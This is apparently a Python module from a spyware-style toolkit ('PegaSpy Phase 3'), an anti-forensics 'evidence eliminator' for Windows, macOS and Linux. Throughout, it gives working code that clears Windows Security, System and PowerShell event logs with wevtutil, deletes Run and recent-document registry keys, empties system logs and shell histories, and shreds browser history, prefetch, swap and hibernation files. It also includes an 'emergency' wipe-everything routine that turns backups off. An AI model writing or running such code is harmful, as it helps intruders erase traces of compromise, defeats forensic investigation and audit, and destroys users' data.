#!/usr/bin/env python3
"""
PegaSpy Phase 3 - Evidence Eliminator
Advanced anti-forensics and evidence elimination capabilities
"""

import os
import sys
import time
import json
import sqlite3
import hashlib
import asyncio
import platform
import subprocess
try:
    import winreg
except ImportError:
    winreg = None
from enum import Enum
from typing import List, Dict, Optional, Tuple, Any, Set
from dataclasses import dataclass, field
from pathlib import Path
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class EvidenceType(Enum):
    """Types of evidence to eliminate"""
    REGISTRY_KEYS = "registry_keys"
    EVENT_LOGS = "event_logs"
    PREFETCH_FILES = "prefetch_files"
    RECENT_DOCUMENTS = "recent_documents"
    BROWSER_HISTORY = "browser_history"
    NETWORK_LOGS = "network_logs"
    SYSTEM_LOGS = "system_logs"
    APPLICATION_LOGS = "application_logs"
    MEMORY_DUMPS = "memory_dumps"
    CRASH_DUMPS = "crash_dumps"
    HIBERNATION_FILES = "hibernation_files"
    SWAP_FILES = "swap_files"
    TEMP_FILES = "temp_files"
    THUMBNAIL_CACHE = "thumbnail_cache"
    JUMP_LISTS = "jump_lists"
    SHELLBAGS = "shellbags"
    MFT_RECORDS = "mft_records"
    USN_JOURNAL = "usn_journal"
    VOLUME_SHADOW_COPIES = "volume_shadow_copies"
    RECYCLE_BIN = "recycle_bin"

class EliminationMethod(Enum):
    """Evidence elimination methods"""
    DELETE = "delete"
    OVERWRITE = "overwrite"
    REGISTRY_DELETE = "registry_delete"
    LOG_CLEAR = "log_clear"
    SERVICE_STOP = "service_stop"
    PROCESS_KILL = "process_kill"
    TIMESTAMP_MODIFY = "timestamp_modify"
    METADATA_WIPE = "metadata_wipe"
    SECURE_DELETE = "secure_delete"

class EliminationStatus(Enum):
    """Elimination operation status"""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"
    PARTIAL = "partial"

@dataclass
class EvidenceTarget:
    """Evidence elimination target"""
    evidence_type: EvidenceType
    target_path: str
    elimination_method: EliminationMethod
    priority: int = 1
    status: EliminationStatus = EliminationStatus.PENDING
    progress: float = 0.0
    error_message: Optional[str] = None
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    items_processed: int = 0
    items_eliminated: int = 0
    backup_created: bool = False
    
    def get_duration(self) -> float:
        """Get elimination duration in seconds"""
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

@dataclass
class EliminationStatistics:
    """Evidence elimination statistics"""
    total_targets: int = 0
    completed_targets: int = 0
    failed_targets: int = 0
    skipped_targets: int = 0
    partial_targets: int = 0
    total_items_eliminated: int = 0
    registry_keys_deleted: int = 0
    log_entries_cleared: int = 0
    files_eliminated: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    
    def get_success_rate(self) -> float:
        """Calculate success rate percentage"""
        if self.total_targets == 0:
            return 0.0
        return (self.completed_targets / self.total_targets) * 100
    
    def get_total_duration(self) -> float:
        """Get total operation duration"""
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return 0.0

class EvidenceEliminator:
    """Advanced evidence elimination and anti-forensics engine"""
    
    def __init__(self):
        self.targets: List[EvidenceTarget] = []
        self.statistics = EliminationStatistics()
        self.is_running = False
        self.stop_requested = False
        
        # Platform detection
        self.platform = platform.system().lower()
        
        # Evidence location mappings
        self._initialize_evidence_locations()
        
        # Backup storage for recovery
        self.backup_dir = Path.cwd() / ".evidence_backup"
        self.backup_enabled = False
    
    def _initialize_evidence_locations(self):
        """Initialize platform-specific evidence locations"""
        if self.platform == 'windows':
            self._init_windows_locations()
        elif self.platform == 'darwin':
            self._init_macos_locations()
        else:
            self._init_linux_locations()
    
    def _init_windows_locations(self):
        """Initialize Windows evidence locations"""
        system_root = os.environ.get('SystemRoot', 'C:\\Windows')
        user_profile = os.environ.get('USERPROFILE', '')
        
        self.evidence_locations = {
            EvidenceType.REGISTRY_KEYS: [
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs',
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU'
            ],
            EvidenceType.EVENT_LOGS: [
                f'{system_root}\\System32\\winevt\\Logs\\Application.evtx',
                f'{system_root}\\System32\\winevt\\Logs\\System.evtx',
                f'{system_root}\\System32\\winevt\\Logs\\Security.evtx',
                f'{system_root}\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx'
            ],
            EvidenceType.PREFETCH_FILES: [
                f'{system_root}\\Prefetch\\*.pf'
            ],
            EvidenceType.RECENT_DOCUMENTS: [
                f'{user_profile}\\AppData\\Roaming\\Microsoft\\Windows\\Recent',
                f'{user_profile}\\AppData\\Roaming\\Microsoft\\Office\\Recent'
            ],
            EvidenceType.BROWSER_HISTORY: [
                f'{user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History',
                f'{user_profile}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite',
                f'{user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History'
            ],
            EvidenceType.TEMP_FILES: [
                f'{system_root}\\Temp',
                f'{user_profile}\\AppData\\Local\\Temp'
            ],
            EvidenceType.THUMBNAIL_CACHE: [
                f'{user_profile}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_*.db'
            ],
            EvidenceType.JUMP_LISTS: [
                f'{user_profile}\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations',
                f'{user_profile}\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations'
            ],
            EvidenceType.HIBERNATION_FILES: [
                'C:\\hiberfil.sys'
            ],
            EvidenceType.SWAP_FILES: [
                'C:\\pagefile.sys',
                'C:\\swapfile.sys'
            ],
            EvidenceType.RECYCLE_BIN: [
                'C:\\$Recycle.Bin'
            ]
        }
    
    def _init_macos_locations(self):
        """Initialize macOS evidence locations"""
        home = os.path.expanduser('~')
        
        self.evidence_locations = {
            EvidenceType.SYSTEM_LOGS: [
                '/var/log/system.log',
                '/var/log/install.log',
                '/var/log/kernel.log'
            ],
            EvidenceType.APPLICATION_LOGS: [
                f'{home}/Library/Logs',
                '/Library/Logs'
            ],
            EvidenceType.BROWSER_HISTORY: [
                f'{home}/Library/Safari/History.db',
                f'{home}/Library/Application Support/Google/Chrome/Default/History',
                f'{home}/Library/Application Support/Firefox/Profiles/*/places.sqlite'
            ],
            EvidenceType.RECENT_DOCUMENTS: [
                f'{home}/Library/Application Support/com.apple.sharedfilelist',
                f'{home}/.bash_history',
                f'{home}/.zsh_history'
            ],
            EvidenceType.TEMP_FILES: [
                '/tmp',
                '/var/tmp',
                f'{home}/Library/Caches'
            ],
            EvidenceType.SWAP_FILES: [
                '/var/vm/swapfile*'
            ]
        }
    
    def _init_linux_locations(self):
        """Initialize Linux evidence locations"""
        home = os.path.expanduser('~')
        
        self.evidence_locations = {
            EvidenceType.SYSTEM_LOGS: [
                '/var/log/syslog',
                '/var/log/auth.log',
                '/var/log/kern.log',
                '/var/log/messages'
            ],
            EvidenceType.APPLICATION_LOGS: [
                '/var/log',
                f'{home}/.local/share/logs'
            ],
            EvidenceType.BROWSER_HISTORY: [
                f'{home}/.config/google-chrome/Default/History',
                f'{home}/.mozilla/firefox/*/places.sqlite'
            ],
            EvidenceType.RECENT_DOCUMENTS: [
                f'{home}/.bash_history',
                f'{home}/.zsh_history',
                f'{home}/.recently-used'
            ],
            EvidenceType.TEMP_FILES: [
                '/tmp',
                '/var/tmp',
                f'{home}/.cache'
            ],
            EvidenceType.SWAP_FILES: [
                '/swapfile',
                '/dev/swap*'
            ]
        }
    
    def add_evidence_target(self, evidence_type: EvidenceType, 
                           target_path: str = None,
                           elimination_method: EliminationMethod = EliminationMethod.DELETE,
                           priority: int = 1) -> bool:
        """Add evidence elimination target"""
        try:
            if target_path is None:
                # Use default locations for evidence type
                if evidence_type in self.evidence_locations:
                    for location in self.evidence_locations[evidence_type]:
                        target = EvidenceTarget(
                            evidence_type=evidence_type,
                            target_path=location,
                            elimination_method=elimination_method,
                            priority=priority
                        )
                        self.targets.append(target)
                        self.statistics.total_targets += 1
                else:
                    logger.warning(f"No default locations for {evidence_type.value}")
                    return False
            else:
                target = EvidenceTarget(
                    evidence_type=evidence_type,
                    target_path=target_path,
                    elimination_method=elimination_method,
                    priority=priority
                )
                self.targets.append(target)
                self.statistics.total_targets += 1
            
            logger.info(f"Added evidence target: {evidence_type.value}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add evidence target: {e}")
            return False
    
    def add_comprehensive_targets(self) -> bool:
        """Add comprehensive evidence elimination targets"""
        try:
            # Add all available evidence types with appropriate methods
            evidence_configs = [
                (EvidenceType.REGISTRY_KEYS, EliminationMethod.REGISTRY_DELETE, 1),
                (EvidenceType.EVENT_LOGS, EliminationMethod.LOG_CLEAR, 1),
                (EvidenceType.PREFETCH_FILES, EliminationMethod.SECURE_DELETE, 2),
                (EvidenceType.RECENT_DOCUMENTS, EliminationMethod.SECURE_DELETE, 2),
                (EvidenceType.BROWSER_HISTORY, EliminationMethod.OVERWRITE, 1),
                (EvidenceType.SYSTEM_LOGS, EliminationMethod.LOG_CLEAR, 1),
                (EvidenceType.APPLICATION_LOGS, EliminationMethod.LOG_CLEAR, 2),
                (EvidenceType.TEMP_FILES, EliminationMethod.SECURE_DELETE, 3),
                (EvidenceType.THUMBNAIL_CACHE, EliminationMethod.SECURE_DELETE, 3),
                (EvidenceType.JUMP_LISTS, EliminationMethod.SECURE_DELETE, 2),
                (EvidenceType.HIBERNATION_FILES, EliminationMethod.SECURE_DELETE, 1),
                (EvidenceType.SWAP_FILES, EliminationMethod.OVERWRITE, 1),
                (EvidenceType.RECYCLE_BIN, EliminationMethod.SECURE_DELETE, 3)
            ]
            
            for evidence_type, method, priority in evidence_configs:
                self.add_evidence_target(evidence_type, None, method, priority)
            
            logger.info(f"Added {len(evidence_configs)} comprehensive evidence targets")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add comprehensive targets: {e}")
            return False
    
    async def execute_elimination(self) -> bool:
        """Execute evidence elimination"""
        if self.is_running:
            logger.warning("Evidence elimination already in progress")
            return False
        
        try:
            self.is_running = True
            self.stop_requested = False
            self.statistics.start_time = time.time()
            
            # Sort targets by priority (higher priority first)
            sorted_targets = sorted(self.targets, key=lambda x: x.priority, reverse=True)
            
            logger.info(f"Starting evidence elimination with {len(sorted_targets)} targets")
            
            for target in sorted_targets:
                if self.stop_requested:
                    target.status = EliminationStatus.SKIPPED
                    self.statistics.skipped_targets += 1
                    continue
                
                await self._eliminate_single_target(target)
            
            self.statistics.end_time = time.time()
            self.is_running = False
            
            logger.info(f"Evidence elimination completed. Success rate: {self.statistics.get_success_rate():.1f}%")
            return True
            
        except Exception as e:
            logger.error(f"Evidence elimination failed: {e}")
            self.is_running = False
            return False
    
    async def _eliminate_single_target(self, target: EvidenceTarget) -> bool:
        """Eliminate a single evidence target"""
        try:
            target.status = EliminationStatus.IN_PROGRESS
            target.start_time = time.time()
            
            logger.info(f"Eliminating {target.evidence_type.value}: {target.target_path}")
            
            # Create backup if enabled
            if self.backup_enabled:
                await self._create_backup(target)
            
            # Execute elimination based on method
            if target.elimination_method == EliminationMethod.REGISTRY_DELETE:
                success = await self._eliminate_registry_keys(target)
            elif target.elimination_method == EliminationMethod.LOG_CLEAR:
                success = await self._eliminate_logs(target)
            elif target.elimination_method == EliminationMethod.SECURE_DELETE:
                success = await self._eliminate_files_secure(target)
            elif target.elimination_method == EliminationMethod.OVERWRITE:
                success = await self._eliminate_files_overwrite(target)
            elif target.elimination_method == EliminationMethod.DELETE:
                success = await self._eliminate_files_delete(target)
            else:
                success = await self._eliminate_generic(target)
            
            target.end_time = time.time()
            
            if success:
                target.status = EliminationStatus.COMPLETED
                self.statistics.completed_targets += 1
            elif target.items_eliminated > 0:
                target.status = EliminationStatus.PARTIAL
                self.statistics.partial_targets += 1
            else:
                target.status = EliminationStatus.FAILED
                self.statistics.failed_targets += 1
            
            self.statistics.total_items_eliminated += target.items_eliminated
            
            return success
            
        except Exception as e:
            target.error_message = str(e)
            target.status = EliminationStatus.FAILED
            target.end_time = time.time()
            self.statistics.failed_targets += 1
            logger.error(f"Target elimination failed: {e}")
            return False
    
    async def _create_backup(self, target: EvidenceTarget) -> bool:
        """Create backup of evidence before elimination"""
        try:
            if not self.backup_dir.exists():
                self.backup_dir.mkdir(parents=True, exist_ok=True)
            
            backup_path = self.backup_dir / f"{target.evidence_type.value}_{int(time.time())}"
            
            # Implementation depends on evidence type
            # This is a simplified version
            target.backup_created = True
            return True
            
        except Exception as e:
            logger.error(f"Backup creation failed: {e}")
            return False
    
    async def _eliminate_registry_keys(self, target: EvidenceTarget) -> bool:
        """Eliminate Windows registry keys"""
        if self.platform != 'windows':
            return False
        
        try:
            import winreg
            
            # Parse registry path
            parts = target.target_path.split('\\')
            if len(parts) < 2:
                return False
            
            root_key_name = parts[0]
            subkey_path = '\\'.join(parts[1:])
            
            # Map root key names to constants
            root_keys = {
                'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
                'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
                'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
                'HKEY_USERS': winreg.HKEY_USERS,
                'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG
            }
            
            if root_key_name not in root_keys:
                return False
            
            root_key = root_keys[root_key_name]
            
            try:
                # Open and delete registry key
                with winreg.OpenKey(root_key, subkey_path, 0, winreg.KEY_ALL_ACCESS) as key:
                    # Delete all values in the key
                    i = 0
                    while True:
                        try:
                            value_name, _, _ = winreg.EnumValue(key, i)
                            winreg.DeleteValue(key, value_name)
                            target.items_eliminated += 1
                            self.statistics.registry_keys_deleted += 1
                        except WindowsError:
                            break
                
                # Delete the key itself
                winreg.DeleteKey(root_key, subkey_path)
                target.items_eliminated += 1
                
            except FileNotFoundError:
                # Key doesn't exist, consider it eliminated
                pass
            
            target.progress = 100.0
            return True
            
        except Exception as e:
            logger.error(f"Registry elimination failed: {e}")
            return False
    
    async def _eliminate_logs(self, target: EvidenceTarget) -> bool:
        """Eliminate log files and entries"""
        try:
            log_path = Path(target.target_path)
            
            if self.platform == 'windows':
                # Clear Windows event logs
                if '.evtx' in target.target_path:
                    cmd = f'wevtutil cl "{log_path.stem}"'
                    process = await asyncio.create_subprocess_shell(
                        cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    await process.communicate()
                    
                    if process.returncode == 0:
                        target.items_eliminated += 1
                        self.statistics.log_entries_cleared += 1
                        target.progress = 100.0
                        return True
            
            # For other platforms or file-based logs
            if log_path.exists():
                if log_path.is_file():
                    # Clear log file content
                    with open(log_path, 'w') as f:
                        f.write('')
                    target.items_eliminated += 1
                    self.statistics.log_entries_cleared += 1
                elif log_path.is_dir():
                    # Clear all log files in directory
                    for log_file in log_path.rglob('*.log'):
                        try:
                            with open(log_file, 'w') as f:
                                f.write('')
                            target.items_eliminated += 1
                            self.statistics.log_entries_cleared += 1
                        except Exception:
                            pass
                
                target.progress = 100.0
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Log elimination failed: {e}")
            return False
    
    async def _eliminate_files_secure(self, target: EvidenceTarget) -> bool:
        """Securely eliminate files"""
        try:
            target_path = Path(target.target_path)
            
            if '*' in target.target_path:
                # Handle wildcard patterns
                parent_dir = target_path.parent
                pattern = target_path.name
                
                if parent_dir.exists():
                    matching_files = list(parent_dir.glob(pattern))
                    total_files = len(matching_files)
                    
                    for i, file_path in enumerate(matching_files):
                        if file_path.is_file():
                            success = await self._secure_delete_file(file_path)
                            if success:
                                target.items_eliminated += 1
                                self.statistics.files_eliminated += 1
                        
                        target.progress = ((i + 1) / total_files) * 100
                        await asyncio.sleep(0.001)
            else:
                # Handle single file/directory
                if target_path.exists():
                    if target_path.is_file():
                        success = await self._secure_delete_file(target_path)
                        if success:
                            target.items_eliminated += 1
                            self.statistics.files_eliminated += 1
                    elif target_path.is_dir():
                        success = await self._secure_delete_directory(target_path, target)
                        if success:
                            target.items_eliminated += 1
                    
                    target.progress = 100.0
            
            return target.items_eliminated > 0
            
        except Exception as e:
            logger.error(f"Secure file elimination failed: {e}")
            return False
    
    async def _secure_delete_file(self, file_path: Path) -> bool:
        """Securely delete a single file"""
        try:
            if self.platform == 'windows':
                cmd = f'sdelete -p 3 -s -z "{file_path}"'
            elif self.platform == 'darwin':
                cmd = f'rm -P "{file_path}"'
            else:
                cmd = f'shred -vfz -n 3 "{file_path}"'
            
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            await process.communicate()
            return process.returncode == 0
            
        except Exception as e:
            logger.error(f"Secure delete failed for {file_path}: {e}")
            return False
    
    async def _secure_delete_directory(self, dir_path: Path, target: EvidenceTarget) -> bool:
        """Securely delete directory and contents"""
        try:
            all_files = list(dir_path.rglob('*'))
            files_only = [f for f in all_files if f.is_file()]
            total_files = len(files_only)
            
            processed = 0
            for file_path in files_only:
                success = await self._secure_delete_file(file_path)
                if success:
                    target.items_eliminated += 1
                    self.statistics.files_eliminated += 1
                
                processed += 1
                target.progress = (processed / total_files) * 100 if total_files > 0 else 100
                await asyncio.sleep(0.001)
            
            # Remove empty directories
            for dir_path in sorted(all_files, key=lambda x: len(str(x)), reverse=True):
                if dir_path.is_dir() and dir_path.exists():
                    try:
                        dir_path.rmdir()
                    except Exception:
                        pass
            
            # Remove main directory
            try:
                dir_path.rmdir()
            except Exception:
                pass
            
            return True
            
        except Exception as e:
            logger.error(f"Directory secure delete failed: {e}")
            return False
    
    async def _eliminate_files_overwrite(self, target: EvidenceTarget) -> bool:
        """Eliminate files by overwriting"""
        try:
            target_path = Path(target.target_path)
            
            if target_path.exists() and target_path.is_file():
                # Overwrite file with random data
                file_size = target_path.stat().st_size
                
                with open(target_path, 'r+b') as f:
                    chunk_size = 64 * 1024
                    written = 0
                    
                    while written < file_size:
                        remaining = min(chunk_size, file_size - written)
                        random_data = os.urandom(remaining)
                        f.write(random_data)
                        written += remaining
                        
                        target.progress = (written / file_size) * 100
                        await asyncio.sleep(0.001)
                    
                    f.flush()
                    os.fsync(f.fileno())
                
                # Delete the file
                target_path.unlink()
                target.items_eliminated += 1
                self.statistics.files_eliminated += 1
                
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"File overwrite elimination failed: {e}")
            return False
    
    async def _eliminate_files_delete(self, target: EvidenceTarget) -> bool:
        """Eliminate files by simple deletion"""
        try:
            target_path = Path(target.target_path)
            
            if target_path.exists():
                if target_path.is_file():
                    target_path.unlink()
                    target.items_eliminated += 1
                    self.statistics.files_eliminated += 1
                elif target_path.is_dir():
                    import shutil
                    shutil.rmtree(target_path)
                    target.items_eliminated += 1
                    self.statistics.files_eliminated += 1
                
                target.progress = 100.0
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"File deletion failed: {e}")
            return False
    
    async def _eliminate_generic(self, target: EvidenceTarget) -> bool:
        """Generic elimination handler"""
        # Default to secure file elimination
        return await self._eliminate_files_secure(target)
    
    def stop_elimination(self) -> bool:
        """Stop the current elimination operation"""
        if self.is_running:
            self.stop_requested = True
            logger.info("Evidence elimination stop requested")
            return True
        return False
    
    def get_elimination_status(self) -> Dict[str, Any]:
        """Get current elimination status"""
        return {
            'is_running': self.is_running,
            'stop_requested': self.stop_requested,
            'total_targets': len(self.targets),
            'statistics': {
                'total_targets': self.statistics.total_targets,
                'completed_targets': self.statistics.completed_targets,
                'failed_targets': self.statistics.failed_targets,
                'skipped_targets': self.statistics.skipped_targets,
                'partial_targets': self.statistics.partial_targets,
                'success_rate': self.statistics.get_success_rate(),
                'total_items_eliminated': self.statistics.total_items_eliminated,
                'registry_keys_deleted': self.statistics.registry_keys_deleted,
                'log_entries_cleared': self.statistics.log_entries_cleared,
                'files_eliminated': self.statistics.files_eliminated,
                'duration': self.statistics.get_total_duration()
            },
            'targets': [
                {
                    'evidence_type': target.evidence_type.value,
                    'target_path': target.target_path,
                    'elimination_method': target.elimination_method.value,
                    'status': target.status.value,
                    'progress': target.progress,
                    'items_eliminated': target.items_eliminated,
                    'duration': target.get_duration(),
                    'error_message': target.error_message
                }
                for target in self.targets
            ]
        }
    
    def enable_backup(self, backup_dir: str = None) -> bool:
        """Enable evidence backup before elimination"""
        try:
            if backup_dir:
                self.backup_dir = Path(backup_dir)
            
            self.backup_dir.mkdir(parents=True, exist_ok=True)
            self.backup_enabled = True
            logger.info(f"Evidence backup enabled: {self.backup_dir}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to enable backup: {e}")
            return False
    
    def disable_backup(self) -> bool:
        """Disable evidence backup"""
        self.backup_enabled = False
        logger.info("Evidence backup disabled")
        return True
    
    async def emergency_elimination(self) -> bool:
        """Emergency evidence elimination"""
        try:
            logger.warning("EMERGENCY EVIDENCE ELIMINATION INITIATED")
            
            # Clear existing targets and add emergency targets
            self.targets.clear()
            self.statistics = EliminationStatistics()
            
            # Add comprehensive targets with maximum priority
            self.add_comprehensive_targets()
            
            # Disable backup for speed
            self.disable_backup()
            
            # Execute elimination
            return await self.execute_elimination()
            
        except Exception as e:
            logger.error(f"Emergency elimination failed: {e}")
            return False
    
    def clear_completed_targets(self) -> int:
        """Clear completed targets from queue"""
        initial_count = len(self.targets)
        self.targets = [target for target in self.targets 
                      if target.status not in [EliminationStatus.COMPLETED, EliminationStatus.SKIPPED]]
        cleared_count = initial_count - len(self.targets)
        logger.info(f"Cleared {cleared_count} completed targets")
        return cleared_count

# Test function
if __name__ == "__main__":
    async def test_evidence_eliminator():
        """Test the evidence eliminator"""
        eliminator = EvidenceEliminator()
        
        print("Testing Evidence Eliminator...")
        
        # Create test evidence
        test_file = Path("test_evidence.txt")
        test_content = "This is test evidence that should be eliminated"
        test_file.write_text(test_content)
        
        print(f"\n1. Created test evidence: {test_file}")
        
        # Add elimination target
        success = eliminator.add_evidence_target(
            EvidenceType.TEMP_FILES,
            str(test_file),
            EliminationMethod.SECURE_DELETE
        )
        print(f"Added elimination target: {success}")
        
        # Execute elimination
        print("\n2. Executing evidence elimination...")
        success = await eliminator.execute_elimination()
        print(f"Elimination completed: {success}")
        
        # Check status
        status = eliminator.get_elimination_status()
        print(f"\nElimination Status:")
        print(f"  Success rate: {status['statistics']['success_rate']:.1f}%")
        print(f"  Items eliminated: {status['statistics']['total_items_eliminated']}")
        print(f"  Files eliminated: {status['statistics']['files_eliminated']}")
        print(f"  Duration: {status['statistics']['duration']:.2f}s")
        
        # Verify evidence is gone
        evidence_exists = test_file.exists()
        print(f"\nTest evidence still exists: {evidence_exists}")
        
        print("\nEvidence eliminator test complete")
    
    # Run the test
    asyncio.run(test_evidence_eliminator())